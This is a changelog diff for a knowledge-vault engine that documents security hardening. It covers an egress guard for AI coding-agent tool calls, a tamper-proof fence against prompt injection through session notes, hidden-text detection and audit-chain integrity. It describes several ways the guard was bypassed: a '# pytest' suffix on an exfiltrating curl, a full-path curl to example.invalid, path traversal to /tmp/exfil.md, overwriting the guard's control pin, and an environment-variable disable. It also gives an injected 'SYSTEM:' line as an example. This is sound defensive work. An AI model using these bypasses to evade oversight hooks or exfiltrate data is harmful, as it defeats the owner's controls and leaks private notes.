@@ -7,6 +7,584 @@ Ruling 3, superseding the earlier opaque `v1, v2, ...` counter).
 
 ## [Unreleased]
 
+## [0.20.36] — 2026-09-04
+### Fixed
+- **The re-ruling worked and the REPORT lied.** `verify-audit
+  --rerule-legacy-pins --yes` derived both its exit code and its `--json`
+  payload from a snapshot taken BEFORE the write, so a run that cleared every
+  finding still exited 1 and printed the unexplained count it had itself just
+  cleared — and `--json`, which discards the text report, showed no sign that
+  anything had been re-ruled. CI and `brain doctor` read exactly those two
+  surfaces. The command now RE-MEASURES after a write (only after a write: the
+  report-only path must never hide live drift) and carries the re-ruling report
+  in the payload as `rerule`.
+- **The disposition file was written in place.** It is the only record of the
+  owner's drift rulings — 108 of them on the reference vault — and
+  `load_drift_dispositions` fails CLOSED on a file it cannot parse, so a write
+  killed mid-flight would have read as zero rulings and turned every explained
+  finding back into an unexplained one. All three writers now stage into a
+  sibling temp file and `os.replace` over the target.
+- **`brain doctor` named only the re-ruling shortcut whenever ANY legacy pin
+  existed**, dropping the triage instruction that covers fresh drift. On a
+  vault with 3 legacy pins and 40 real ones, the suggested command cleared 3
+  and the row still reported 40 with no next step. It now names both when the
+  shortcut cannot clear everything.
+
+  Found by the cloud review of `618bb1ff`, 2026-09-04.
+
+### Changed
+- **The M-7 re-ruling queue had nothing that could write to it.**
+  `mark_legacy_hash_convention` stamps every pre-2026-09-02 drift disposition
+  `text (legacy, unverifiable)`, refuses it as an explanation, and says "the
+  notes they covered surface as unexplained until re-ruled". Nothing in the
+  engine, `tools/` or `scripts/` had ever written the disposition file at all,
+  so there was no re-ruling step: on the reference vault the stamp turned 108
+  standing owner rulings into 97 unexplained drift findings and a stale
+  `brain doctor` row that no command could clear. `brain verify-audit
+  --rerule-legacy-pins` is that missing writer — it lists the refused pins,
+  and only with `--yes` re-records them.
+  **What makes it safe is the refusal marker itself.** A record reaches
+  `needs_reruling_text_hash_convention` only when its pin already matched on
+  path, issue AND the observed hash — and after M-7 that observed hash is the
+  note's RAW BYTES. So the equality IS the byte anchor the stamp's own
+  docstring said did not exist: the ruled-on text hash equals today's byte
+  hash, which means today's file carries no carriage return, and a CR-only
+  edit after signing changes the byte hash and never reaches the queue. The
+  hashes are therefore never re-keyed; only the `convention` flag is dropped,
+  and `reruled_from` keeps the history. The residual is stated rather than
+  hidden: an edit that only REMOVES carriage returns produces the same
+  equality, which is why re-ruling is an owner act with an explicit `--yes`
+  and is never called by a fold.
+  Measured on the reference vault: 97 unexplained -> **2**, and the two left
+  are `raw/2026-07-11-de-galpify-map.md` and
+  `raw/2026-07-11-originals-migration-map.md` — the only two of the 41
+  in-place edits whose bytes differ from their normalised text form, so their
+  refusal is correct and they stay on the queue. The write is keyed on the
+  same `(path, issue, hash)` triple `_candidate_disposition` matches, not on
+  the path: a first cut keyed by path re-ruled a SHADOWED duplicate pin that
+  `load_drift_dispositions` (which keys by path, last wins) never consults and
+  that never reached the queue — 95 queued paths, 96 records written.
+- **MED-10: the concealment verdict reaches a reader.** Ingest has recorded
+  hidden text in a note's `injection_assessment.*` frontmatter since
+  M-3; nothing that returns a note to a person or an agent said a word about
+  it, so the finding died in the ingest record. `search`, `dossier`, `get`,
+  `grep`, `recent` and `bases-query` now each carry a `concealment` field on
+  every row, on the CLI and the MCP leg alike — `hidden:<n>`, `clean`, one of
+  six scan-state words, or `unknown`. **`unknown` is never `clean`**: it means
+  nobody looked, which is true of every note written before detection existed.
+  The human renders print a warning line for `hidden:<n>` only; the JSON
+  always carries the raw value. **The surface count was re-measured first**
+  (`_evidence/security-followup/s05c-surface-inventory.txt`) and both prior
+  numbers were wrong: the design note's six, and a grep-derived two. There are
+  THREE Hit builders, and the primary search path is not one a `Hit(` grep can
+  find — `search_finalization.materialize_hits` builds through an injected
+  `hit_factory` bound 144 lines away in another file, so scoping the work to
+  the two literal sites would have stamped the dossier probe and the graph
+  hydration and missed ordinary `brain search`. Storage is one nullable
+  `notes.concealment` column INSIDE `_create_schema`, because `rebuild` swaps
+  a freshly built database file into place and destroys anything created
+  outside it; **`SCHEMA_VERSION` is unchanged at 4** — a bump would force a
+  full re-index and re-embed of every registered vault — and an index that
+  predates the column is migrated by an idempotent `ALTER TABLE ADD COLUMN`,
+  with a read-only VM snapshot degrading to `unknown` rather than raising.
+  Emitting the field at every tier is a decision, not an inheritance: the
+  egress gate filters rows and never strips fields, and the value is a closed
+  vocabulary plus a count about a row the caller may already read. Detection
+  stays FORWARD-ONLY and no backfill was built.
+  **`clean` is NOT a provenance claim, and that is a ruling, not an
+  oversight.** The verdict is projected from the file on disk and nothing
+  verifies the bytes were signed, so `clean` means "the frontmatter said so".
+  An audit-chain gate was built and withdrawn: four adversarial-review rounds
+  found four ways past it, the last two being `brain rebuild` (no audit facts,
+  and `sync` escalates into it on a schema or embed-model change) and an
+  unreadable `audit.jsonl` (which made the gate inert, and inert here means
+  granting the assurance). `hidden:<n>` — the value that protects a reader —
+  never depended on the chain.
+  (`_evidence/security-followup/s05c-rebuild-proof.txt`)
+- **MED-11: the CSS bypasses close, and the concealment coverage ledger stops
+  lying in three ways.** The item named four handler-side CSS bypasses;
+  measuring first (`_evidence/security-followup/s05d-css-probe.txt`) showed
+  three of them — `display:none`, `visibility:hidden`, off-canvas
+  `text-indent` — were already detected on the handler path, and only
+  `clip`/`clip-path` was open. Five clip shapes now resolve in
+  `concealment_html._undisplayed`, reusing `hidden_display_none` rather than
+  inventing a marker family; seven ordinary clipping shapes stay silent.
+  `text-indent` in PERCENTAGE units is a stated gap (it needs layout) and is
+  pinned as one. Four coverage defects a round-6 adversarial review left
+  visible are closed with it. **Occurrence-aware accounting:**
+  `Admitted.uninspected` tested containment, so one inspected occurrence of a
+  text satisfied an identical occurrence the walker never saw — a DOCX
+  carrying its payload twice read `full` with zero concealed runs. It is a
+  cursor over the walker's report now, and a renderer that legitimately
+  repeats text DECLARES it (`Admitted.repeat`, used by `html.py` for the
+  `<title>`). The `BRAIN_CONCEALMENT_ATTEST_FULL` switch that withheld the
+  grant meanwhile is deleted. **Provenance:** `Admitted.watch` returned a
+  bare `list.append`, so a handler wired from its RENDERER satisfied its own
+  coverage check with its own output and failed OPEN; the sink records the
+  calling module and `COVERED_SOURCES` declares each walker's, so the
+  miswiring names itself. **The `unknown` bucket splits three ways** —
+  `uncovered` (a known population: no walker for that source), `uninspected`
+  and `unaccounted` (a COVERED lane failed), the last two in
+  `REGRESSION_BUCKETS`, each printing the `grep` that lists the notes.
+  **Gap 5 closes:** the PDF visitor decodes glyph-coded operands through the
+  page's own fonts, the way pypdf's extractor does. Measured on the reference
+  corpus, three PDFs that failed round 6 went 2/8/10 short pages to 0/0/0,
+  and the `/Encoding /Differences` fixture that could only be MARKED now
+  convicts. Word TOC hyperlinks and PPTX `a:fld` slide numbers close
+  generically, by walking `w:r`/`a:t` descendants instead of branching on the
+  container. The catch census derives its file list from PARTICIPATION now
+  (the ledger's data flow, read off the AST) rather than the word
+  "concealment", which is what had left `tables.py` outside it.
+  **And a fourth divergence, found by measuring the residue rather than
+  reading the diff:** round 6's three were all the walker reading LESS than
+  the note carried; 8 reference-corpus DOCX had the opposite — a Word content
+  control (`w:sdt`) whose text `paragraph.text` (and so `cell.text`) drops
+  while the walk reads it, which lost that text from the note AND split the
+  admitted paragraph inside the walker's report so the cursor scored a correct
+  walk as a shortfall. Both halves of `docx.py` read the element that HOLDS
+  text now, the same rule `docx_runs` uses, so they cannot disagree by
+  construction. Whole-corpus coverage went **384 of 541 documents (71.0%) to
+  530 of 542 (97.8%)**, with `.docx` at 189 of 189; over-fire stayed at
+  **0.00%** per-document and per-block across 540 documents. The 12 remaining
+  are honest: 9 `uncovered` sources that have no walker at all (OCR lanes,
+  `email:body_plain`) and 3 PDFs whose stamped agency reference sits in a font
+  the decode ceiling names.
+- **M-5: the vendor posture register is retired, superseded by A-01.**
+  `docs/harness-allowlist.json` said all three AI harnesses were unverified
+  PENDING and should run only against a projected workspace; practice (the
+  owner's 2026-08-17 ruling, A-01) is the full vault for all three, so the
+  register never agreed with practice. `egress.is_allowed()` (its only
+  reader) and `tests/test_harness_allowlist.py` are removed;
+  `docs/harness-allowlist.json` is marked `retired: true` and
+  `docs/operations/egress-provider-posture.md` §4 carries a banner pointing
+  at `docs/security-acceptances.md` A-01. `docs/security-acceptances.md` also
+  gains a "Closed 2026-09" index of every finding this plan closed, and
+  A-10/A-11 for the two remaining accepted risks (a plaintext backup's
+  missing-manifest restore, and the unbounded double `.xlsx` expansion).
+- **M-2: the outbound term guard covers every door and fails CLOSED.** The
+  SEC-07 `PreToolUse` guard watched `WebSearch|WebFetch` — two doors, while the
+  repo-local settings allowed `Bash(python3 *)` with no prompt, so the cheapest
+  bypass was a shell command. The matcher is now
+  `WebSearch|WebFetch|Bash|PowerShell|Write|Edit|NotebookEdit|Read|Grep|Glob|mcp__.*`, and the script reads the text
+  that actually leaves PER TOOL (`command`, `content`, `old_string`/`new_string`,
+  `query`/`url`/`prompt`, and the whole JSON arguments for anything else) rather
+  than the whole tool input — reading the whole input would refuse every edit of
+  a vault note whose FILENAME is a codename, and an over-refusing guard is
+  switched off within a day. `--strict` (an empty decoder ring is itself a
+  refusal) is passed to the WEB tools only, so a vault whose ring has not filled
+  yet loses a search and not its own shell. A `check-egress` that RUNS and fails
+  now blocks with its reason printed; only exit 6 used to, and every other
+  failure ALLOWED — a guard an attacker only had to break.
+
+  **It keys on the DESTINATION, not the tool name, and there is no tests
+  exemption.** The first cut of this widening did both the other way and both
+  were wrong. Keying on the tool refused `brain search "<codename>"`, a `grep`
+  over the vault and a vault note that mentions a term — measured exit 2 on all
+  three, the three most ordinary things anyone does with this vault, and an
+  over-refusing guard is uninstalled the same day. A call is checked now only
+  when its destination is off this host: always for the web tools and every
+  `mcp__*`; for `Bash` when the command names an outbound program or carries a
+  URL; for a write when the target is outside the working tree and outside
+  `$BRAIN_VAULT`. That `Bash` rule is an ENUMERATION and therefore a FLOOR —
+  the script's header states what it misses. The tests exemption was a
+  substring test on the tool's own ARGUMENTS (`*pytest*`, `*/tests/*`), so an
+  injected instruction could append `# pytest` to an exfiltrating `curl` and be
+  allowed — measured exit 0. It is gone; the gate command passes because
+  `pytest` sends nothing off this host.
+
+  **And there is no in-band escape either (rework 2).** `BRAINIAC_EGRESS_GUARD=off`
+  was documented as owner-only because this hook inherits Claude Code's own
+  environment and never a tool payload's. Both halves true, conclusion wrong:
+  Claude Code lets COMMITTED PROJECT SETTINGS define a session's environment
+  variables, so a collaborator's repo change — or an injected settings edit —
+  disarmed the guard for every later call and nothing reported it was off. The
+  script no longer reads the variable; recovery is external (quit Claude Code,
+  remove the hook's `PreToolUse` entry from `~/.claude/settings.json`, restart),
+  and `brain doctor`'s SEC-07 row names the variable whenever a session still
+  carries it — a host still running a pre-2026-09-03 copy of the script IS
+  disabled by it.
+
+  **An UNREADABLE decoder ring now refuses, on every tool (rework 2).** The
+  read failure was swallowed, so a ring that could not be read was
+  indistinguishable from one that was empty — and empty only refuses under
+  `--strict`, which reaches the two web tools alone. Measured end to end, same
+  payload, same vault: ring readable -> exit 2, ring `chmod 000` -> exit 0. The
+  refusal names the file and does not wait for `--strict`.
+
+  **A leading path no longer defeats the outbound list, and `git push` gained a
+  left word boundary (rework 2).** `curl -d @f example.invalid` refused while
+  `/usr/bin/curl -d @f example.invalid` — the same program, on the list — was
+  allowed; every token is reduced to its basename before matching now. And
+  `echo legit push` ("le-git push") used to REFUSE, a false refusal on ordinary
+  prose. The destination test is bash's own `=~` rather than a pipe into
+  `grep -q`: `grep -q` exits on its first match, the writer takes SIGPIPE, and
+  under `set -o pipefail` a MATCH then read as "not outbound" and allowed.
+
+  **Write containment is canonicalised (rework 2).** It was an unnormalised
+  string-prefix test, so `/tmp/exfil.md` refused while
+  `<tree>/../../../../../tmp/exfil.md` — the same file — was allowed. Target,
+  working tree and vault are all resolved (symlinks included, existing parent
+  for a not-yet-created file) before the containment test, and a path that will
+  not resolve is CHECKED rather than exempted.
+
+  **The vault comes from the HOST REGISTRY, per call, and a session keeps what
+  it has seen (rounds 5-7).** Three consecutive review rounds each closed one
+  environment variable the guard trusted — `$BRAIN_BIN`, then `$BRAIN_VAULT`,
+  then `$BRAINIAC_HOME` and `$PATH` — because each asked "is THIS input trusted"
+  when the question was "does this script trust the environment at all".
+  `brain install-hook` now pins a LOCATION beside the script
+  (`<script>.registry` -> `~/.brainiac/workspaces.json`, host-owned), each call
+  matches its own `cwd` against that registry, and the interpreter, `PATH` and
+  `jq` are all absolute. A `cd` does not empty the conversation, so every vault
+  a session enters is appended to `<registry dir>/egress-sessions/<session id>`
+  and later calls are judged against the UNION of those rings — as ONE engine
+  call via the new public `brain check-egress --extra-vault PATH` (repeatable),
+  because one call per vault measured 0.96s for one and 2.19s for two against a
+  5-second budget that FAILS OPEN, and this host registers four vaults. Merging
+  re-measured at 0.79s for two. A vault that leaves the registry mid-session
+  REFUSES rather than dropping out quietly, a refusal names the vault whose ring
+  holds the term, and `brain doctor` carries non-gating rows for the pins and
+  for the session-state directory (pruned after 30 days by `install()`).
+  **The union follows every path a call NAMES, not just its directory.** An
+  absolute path in a structured field counts as entering, and for `Bash` so does
+  every absolute-looking token in the command text — one `sed` expression used
+  to match unquoted `--vault /path` and miss `--vault "/alpha/vault"`,
+  `cat /alpha/vault/note.md` and `cd /alpha/vault`, each of which is a read that
+  never joined the union. `Read`, `Grep` and `Glob` are matched for that
+  provenance and are RECORD-ONLY: they exit before any destination test and can
+  never refuse. All candidates resolve in ONE `jq` call (measured 186 ms for a
+  30-path command line, 66 ms on the read path, against a 5-second budget that
+  fails open).
+
+  **The guard's own control files are refused as a destination.** The `.engine`
+  pin names the executable the guard trusts and `egress-sessions/<id>` holds
+  every vault the session entered — both ordinary owner-writable files, and a
+  local write sends nothing off the host, so `printf /bin/true >` into the pin
+  was a permanent kill switch that `brain doctor` reported healthy. The match
+  covers both spellings of those directories, raw and `pwd -P` resolved.
+
+  **Stated limits:** an MCP read through the desk carries no directory and no
+  path, a path built from a shell variable is outside the same match, the
+  control-file refusal is a floor rather than a boundary, and the union's
+  behaviour at the subagent `session_id` boundary is untested — see
+  `docs/security-acceptances.md` A-06, limits 3 to 5.
+
+  **Two states allow, deliberately, and the record now says so:** no engine
+  found at all, and no vault resolvable from here (no vault means no ring means no
+  authority — `check-egress` used to RAISE there, so the hook refused every
+  call on the host). The 5-second hook timeout is
+  FAIL-OPEN besides: Claude Code cancels a timed-out `PreToolUse` command hook
+  and the call proceeds. Missing `jq` no longer silently drops `--strict`
+  (measured `ARGS:[check-egress]` versus `ARGS:[check-egress --strict]`), and
+  `WebSearch`'s `allowed_domains`/`blocked_domains` are read like its query.
+
+  Measured on the reference vault (39-term ring: 23 hand-written, 16
+  generated): **0 false refusals across 20 local calls — 14 of this repo's own
+  documented commands plus 6 that each carry a live ring term — and 9/9
+  refusals on the outbound set**, each row driven through both the failed build
+  and this one in the same run
+  (`_evidence/security-followup/s06-guard-probe.txt`).
+
+- **M-2 rework 2: hook ownership is the registered COMMAND, not a substring.**
+  Migration decided an entry was ours if the script's BASENAME appeared anywhere
+  in its command string, and stopped at the first match. Given an unrelated
+  wrapper whose command merely mentions that basename, listed first, migration
+  rewrote THAT hook's matcher to the guard's wide one — so someone else's hook
+  began firing on every `Bash`, `Write`, `Edit` and MCP call — and left the real
+  guard on the old two-tool matcher, reporting `migrated, ok: True`. Ownership
+  is now the command's own program token (first shell word, path stripped), and
+  every matching entry is examined. A matcher-less spec (the `SessionStart`
+  banner) no longer treats an owner-authored matcher as stale and strip it,
+  which had been silently widening when the banner fires. And on a
+  harness-managed `~/.claude`, where this engine may not write `settings.json`
+  at all, a registration fault is `manual-required` rather than the GATING
+  `stale` — a red row nothing on that host can ever clear is a row that gets
+  deleted.
+
+- **M-2 rework 2: the broad-allow detector reads Claude Code's own syntax.**
+  `_BROAD_INTERPRETER` required a space before the wildcard, so
+  `Bash(python3:*)` — the documented colon-suffix prefix form — did not match
+  and a host that pre-approves arbitrary interpreter execution scored `current`.
+  Permission rules are normalised (`:*`, ` *`, ` -`, and an `env`/`FOO=1`
+  prefix) before classifying, with positive regressions for both shapes and
+  negatives for the scoped ones.
+
+- **M-2: an upgrade actually reaches a machine that already had the guard.**
+  `session_hook._already_registered` matched on the SCRIPT PATH alone, so a
+  `~/.claude` carrying the previous release's `matcher: "WebSearch|WebFetch"`
+  entry reported `already-registered` / `ok: True` and nothing was written: the
+  new script landed, the widened matcher did not, and `Bash`, `Write`, `Edit`
+  and every MCP call still never reached the guard. The whole widening shipped
+  as a no-op to its entire installed base and said it had worked. Registration
+  is now the entry AND its exact matcher; `install` MIGRATES a stale one
+  (rewriting the matcher in place when the group is ours alone, re-homing the
+  entry when we share the group, so another hook's firing conditions never
+  change) and reports `migrated`; and the `brain doctor` rows call a stale
+  matcher `stale`, printing both the matcher found and the one expected.
+- **M-2: `brain doctor` sees whether the owner applied the permission edit.**
+  `.claude/settings.local.json` is gitignored, so no test, CI leg or fresh clone
+  can enforce the matching half of this fix — it reverts silently on a new
+  machine or worktree, and an acceptance review would score the finding closed
+  while the live hook still matched two tools. A new non-gating row,
+  `SEC-07 guard wiring (repo-local settings)`, READS the live file and reports
+  the broad interpreter allows still present and whether the `PreToolUse` stanza
+  is there — and it fails an entry registered under the OLD matcher rather than
+  reading it as current. Its broad-allow detector was widened after review: the
+  first cut matched only `<interpreter> *` and `<interpreter> -`, missing the
+  explicit eval form (`python3 -c *`, `sh -c *`, `node -e *`) and every runner
+  that fetches and executes without naming an interpreter (`uv run *`, `npx *`,
+  `uvx`, `bunx`, `pipx run`, `pnpm dlx`) — four doors of eight. It is WARN by
+  design: the file is the owner's to edit, this engine never writes a
+  permission file, and a gating row would hold `brain update` and every CI leg
+  hostage to a manual step. The exact edit is written out for the
+  owner at `_evidence/security-followup/m2-settings-edit.md` (measured
+  2026-09-03: 31 allow entries, 4 broad interpreter allows, no `PreToolUse`
+  stanza).
+- **M-8: the frontmatter terminator is a LINE, not a substring.**
+  `frontmatter.split` cut at the first `---` ANYWHERE after the opening fence,
+  so a note titled `A --- B` ended its own frontmatter inside its title and
+  every key after it — `provenance.trust` included — silently became body. It
+  now terminates only on a line that is exactly `---` (`^---(?=\r?$)`,
+  MULTILINE). The line-end test is a LOOKAHEAD so the match consumes only the
+  three dashes and a CRLF note's body keeps its own `\r`: the returned pair is
+  byte-identical to the old one for every well-formed note, which matters
+  directly to the byte-exact content hashes in this same release. A body `---`
+  rule was already safe and stays untouched. `tools/validate.py` carries the
+  same fix — AGENTS.md's contract is that the engine and the validator never
+  disagree about note shape, and a test now pins them to each other. Measured
+  on this checkout before the change: 0 of 13 notes with frontmatter carry an
+  inline `---` inside it, so nothing in the vault moves.
+- **M-8: a Word or PowerPoint file is bounded by its UNCOMPRESSED size.** The
+  docx/pptx handlers capped the file on disk (100 MB / 150 MB) — which says
+  nothing about extraction, because both formats are zips. Measured 2026-09-02:
+  a 110 KB `.docx` declared 30.5 MB uncompressed (278:1) and was ingested
+  whole, producing 29.7 MB of Markdown at a 68 MB RSS delta. Both handlers now
+  sum `ZipInfo.file_size` from the central directory before decompressing
+  anything and quarantine `ooxml_expansion_suspected` past
+  `MAX_OOXML_UNCOMPRESSED_BYTES` (256 MB). That reason word is its OWN, not the
+  plain-zip handler's `zip_bomb_suspected`: `zip.py` refuses on declared size
+  AND counts real output bytes as they arrive, this gate does the first only,
+  and sharing the word made the quarantine report assert a streamed defence
+  this path does not perform. Declared size is nonetheless a real bound here,
+  measured rather than assumed (CPython 3.13, 2026-09-02): `ZipExtFile` carries
+  `_left = zinfo.file_size` from the central directory and stops there, so a
+  member whose declared size UNDERSTATES its payload yields at most that many
+  bytes and then fails its CRC — and both readers behind this gate go through
+  `zipfile`. A test pins that with a hand-patched mismatched `file_size`; if a
+  future Python or a non-`zipfile` reader breaks it, the ceiling has to be
+  re-derived as a streamed count. The bound is STATED, not derived:
+  there is no `vault/raw/originals` in this checkout and `vault/raw` holds zero
+  Office files, so there is no largest-legitimate-deck to multiply. A real deck
+  refused by it is a reason to raise it deliberately, never to widen it for one
+  file. Owner ruling (L7, 2026-09-02) approved the size bound only; a sandbox
+  draft declaring `type: decision` is deliberately left unchanged.
+- **M-7: an EMPTY audit chain is no longer a pass.** A vault whose log was
+  wiped and a vault that has never signed a note verify identically — zero
+  entries, zero errors — and `verify-audit` returned 0 for both, so the wipe
+  read as an all-clear from every caller of that exit code. It now exits
+  non-zero on an empty chain unless the operator says which case this is with
+  `--allow-empty`, and the `brain doctor` drift row reports "no signed notes"
+  (not-detectable, non-gating) instead of "no drift — every signed note matches
+  its signed bytes". `health()` and `integrity()` raise it too, which is the
+  half that actually matters: those two back `brain health` / `brain integrity`,
+  which is what `brain maintain` and the nightly fold run, so until now a wiped
+  log still produced a fully green unattended night and only an interactive exit
+  code disagreed. They distinguish the two vaults rather than asking the
+  operator to: the log FILE is the trace of past signing (`_append_record` is
+  the only thing that creates it), so a log truncated in place is reported and a
+  vault that has never signed — including a freshly seeded one, whose sample
+  notes are written with `write_text` — stays silent. Stated residual: a wipe
+  that DELETES the log on a vault with no off-host anchor leaves no trace here,
+  which is the gap `integrity()`'s "no off-host anchor configured" item already
+  tells the operator to close.
+- **M-8: `tools/validate.py` names the note class the stricter fence rejects.**
+  The line-anchored split is strictly stricter than the substring split it
+  replaced: a closing fence written `"--- "` no longer terminates, so the note
+  either loses all its frontmatter or swallows body text into the block until
+  the next exact fence. `split` is NOT loosened for it — byte identity is
+  load-bearing and confirmed against all 6067 live notes — so the validator
+  warns instead, naming the file and the line. Measured 2026-09-02: 0 of 4938
+  notes across every registered vault carry one, so the tests give it a known
+  positive as well as a known negative — an all-clear is the only thing this
+  check has ever returned.
+- **The owner's L7 refusal is in the register, not only in this file.**
+  `docs/security-acceptances.md` A-07 records the risk (an untrusted-authored
+  draft can declare `type: decision` and land in the layer `brain dossier`
+  reports as the decision layer), the ruling and its date, which lanes are
+  bounded by a host step and which are not, and the measured standing count:
+  32 notes across every registered vault carry both `provenance.trust:
+  untrusted` and `type: decision` today, none of them mutated.
+- **M-7: the audit chain now hashes the note's RAW BYTES, and reads its own log
+  as bytes.** `content_drift` hashed the file after `Path.read_text()`, which
+  applies universal-newline translation — so an edit that changed ONLY carriage
+  returns produced an identical hash and was invisible to `verify-audit`, while
+  a note legitimately written with CRLF reported drift forever with no edit to
+  point at. Measured on the live reference vault: 4 of the 99 reported drift
+  records were false alarms whose bytes match their signed hash exactly, and 2
+  more paths carry CRLF on disk against an LF-normalised hash the 2026-08-24
+  `bind` coverage backfill wrote — invisible under the old convention, and the
+  reason that tool is fixed here too. The digest now has ONE definition,
+  `notes.sha256_file`, shared by EVERY site that writes or compares one:
+  `content_drift`, both `remediation_branches` provenance checks,
+  `tools/bind_witnessed_chain_paths.py`, the `auto_para` PARA fold, the
+  VULN-3387 sync downgrade guard, and the two COS bridge delivery readbacks.
+  The last three were found by sweeping the whole class rather than the one
+  caller a review named (2026-09-02): `auto_para` signed
+  `sha256_text(read_text(...))` and then renamed the file without rewriting it,
+  so a CRLF note reported permanent UNEXPLAINED `content_drift` the instant the
+  fold correctly filed it — a false tamper alarm manufactured by a
+  correct, audited move. The sync guard compared the chain's byte digest to
+  `Note.content_hash` (a text hash), so an audited declassification of a CRLF
+  note was refused and reported as unexplained drift forever. The two COS
+  readbacks were latent — `capture.enforce` normalizes CRLF out of every
+  proposal today, which is a coincidence, not a guarantee.
+  `Note.content_hash` itself is deliberately UNCHANGED: it is the index's own
+  change-detection key, shared with the vault fingerprint and the graph
+  manifest, and nothing compares it to a chain digest any more.
+  Hashing bytes is not enough on its own: `AuditChain._lines()` also reads the
+  log as bytes and splits strictly on `b"\n"`, with no `strip()` and no
+  re-encode. Python text mode also ends a line on `\r`, `\v`, `\f`, U+2028 and
+  U+2029, so swapping one `0x0b` in for a record separator left a log whose
+  bytes hold a single merged record while the verifier still saw two intact,
+  fully verifying ones. `remediation_branches.chain_provenance` held a second
+  text-mode reader of the same log and now goes through the chain's own.
+  The audit log and its sidecar lock also open owner-only
+  (`config.SECURE_FILE_MODE`) and with `O_NOFOLLOW`: the log names every path
+  this vault has ever written, it was created with the process umask
+  (world-readable on a typical default), and a symlink planted at either name
+  would have redirected a signed append or a lock truncation.
+- **A `tampered` verdict with a proven benign cause now says so.** The strict
+  `b"\n"` split above is right and stays — but its cost is that an INTACT chain
+  appended in TEXT MODE on a Windows host (a supported target in the build
+  matrix, by any engine older than this release) reports `not_canonical` on
+  every entry plus a `prev_hash_mismatch` cascade: the loudest alarm this
+  system owns, pointed at nothing, with no route out. `verify()` now adds a
+  `diagnosis` naming that case, and `verify-audit` prints it as
+  `NOT TAMPERING: …`. It is PROVEN, never guessed — emitted only when dropping
+  one trailing CR per record makes the whole chain verify clean, which a
+  substituted payload never does, so a tamperer who also rewrites the line
+  endings gets no cover story. The verdict, the errors and the exit code are
+  unchanged: the bytes on disk really are not canonical. Zero such logs exist
+  on the reference host (9 chains, 3.4 MB largest, measured 2026-09-02); this
+  is for the Windows install nobody can inspect from here.
+- **The drift dispositions recorded under the old hash are marked, kept, and no
+  longer explain drift.** They are deliberately NOT re-keyed: there is no
+  trusted byte anchor for a note ruled on under a hash that cannot see a
+  CR-only edit, so any predicate built on it would re-bless exactly that drift
+  — permanently, because the migration runs once. Each pre-cutover pin is
+  stamped `convention: "text (legacy, unverifiable)"`, the file records
+  `migrated_hash_convention` with the date and the count, and the notes they
+  covered surface as UNEXPLAINED for the owner to re-rule against bytes. That
+  count is the size of the re-ruling task, not a failure. Dispositions recorded
+  after the cutover are byte-keyed and unaffected.
+- **The "no off-host anchor configured" warning has its own slot.** It was
+  written only `if audit_issue is None`, so the moment the chain had any other
+  finding — the case where a truncated tail matters most — the one line saying
+  nothing could detect a truncated tail vanished. `integrity()` now returns
+  `anchor_issue` alongside `audit_issue`, and both maintain surfaces report it.
+- **M-6: the session-notes fence is a marker the content cannot write.** Both
+  session-start hooks paste the last session's `handoff.md` into the new session
+  inside a triple-backtick fence — which the content can simply *write*. A line
+  of three backticks in `handoff.md` closed the block, and everything after it
+  arrived as prose the model reads as instruction. Measured, not reasoned: the
+  probe in `_evidence/security-followup/s08-fence-before.txt` shows
+  `SYSTEM: do X` sitting outside the fence. The hooks now mint a marker per run
+  (`head -c 16 /dev/urandom | base64`, alphanumerics only), open the block with
+  `BEGIN-<marker>` and close it with `END-<marker>`, and the sanitizer
+  neutralizes any line carrying the marker; the five-regex sanitizer stays as
+  the second layer. The RECENT COMMITS block gets the same treatment — a commit
+  subject is content too.
+
+  **An empty marker is no fence, so the hook aborts instead of degrading.**
+  `set -e` does not see a failure inside a pipeline and `base64` exits 0 on
+  empty input, so a dead `/dev/urandom` would have opened the block with an
+  empty marker and reported nothing. The mint runs under `set -o pipefail` with
+  an explicit non-empty check; either failure exits non-zero with a reason on
+  stderr and injects nothing. Both branches are pinned by tests that stub the
+  random source — one that prints nothing and exits 0, one that prints valid
+  bytes and exits 1 (dropping `pipefail` makes the second proceed, verified).
+
+  **Both hooks, and a test that fails when they diverge.**
+  `.codex/hooks/session-start.sh` is git-tracked, carried the same forgeable
+  fence, and had already drifted from its `.claude` twin by 37 lines with
+  nothing enforcing sync — so the fix went to both, and
+  `tests/test_session_start_hook.py::test_the_two_hooks_build_the_same_fence`
+  compares the three fence-construction regions between them. The rest of the
+  two files may differ; the fence may not.
+
+  **The synthesis model keeps its pen on session memory — owner ruling
+  2026-09-02 (L5, refused).** The scoped loss was to stop the weekly synthesis
+  model writing `handoff.md`/`hot.md`/`lessons.md` and have the engine write a
+  fixed-shape summary line instead. The owner refused it: "Keep today's
+  behaviour... Recorded as an accepted risk." The `Edit` grant on
+  `.brain/memory/**` in `scripts/brain-synthesis.sh` stands, and no test asserts
+  its absence.
+- **VULN-3385 is CLOSED (owner ruling 2026-09-01), and its residual moved to a
+  new register entry rather than disappearing.** The finding had been
+  MITIGATED-AND-OPEN since 2026-08-30 against a closure test written before the
+  work started: "a per-caller tier ceiling for the Cowork leg". That ceiling was
+  declined on 2026-08-31, which the record then read as leaving no path to
+  closure. The owner ruled the TEST was wrong. The reported incident was an
+  agent reading a note off disk — unfiltered, unrecorded, with write access —
+  and every part of that is fixed and measured. An agent obtaining a high-tier
+  note *through* the broker is functionality, already ruled at A-01: it may
+  read what its owner may read.
+  **A-01 carried a false sentence and it is corrected in the same change.** It
+  justified the full vault with "`--role vm` still defaults to Internal, which
+  is where the boundary actually is" — untrue on the live path, because the
+  Cowork leg arrives through a Desktop stanza with no role and has never
+  carried one. A-01 now says so, and states where the boundary really is.
+  **New A-06 — indirect prompt injection on the Cowork leg**, accepted at LOW
+  severity with its reasoning and three limits: the owner reviews the document
+  that leaves; the Cowork VM runs behind an egress allowlist (our own install
+  lane depends on it — the ONNX model is bundled because HuggingFace is not on
+  it); and the controls built for it are SEC-07, the self-filling decoder ring
+  and the two unattended injection alarms. Stated limits: SEC-07 is enforced
+  only where Claude Code hooks run, so on the Cowork leg it is prose and not a
+  mechanism; the guard matches declared terms on word boundaries and cannot see
+  a paraphrase; and the allowlist is Anthropic's, unverifiable from this
+  repository, so the honest claim is "restricts egress", never "has no outbound
+  channel".
+  Every surface restating the old status moved together: the record's header and
+  §5 (which preserves the original argument as §5a rather than deleting it),
+  `AGENTS.md` and both mirrors, `docs/install/cowork.md`'s warning box, and
+  `docs/security-overview.html`.
+
+### Added
+- **The decoder ring fills itself.** The SEC-07 outbound guard shipped in
+  0.20.35 reads `overlay/keywords/`, which is hand-written — so on every vault
+  nobody curates it is empty and the guard can only report "no term could have
+  been caught". A nightly fold now regenerates
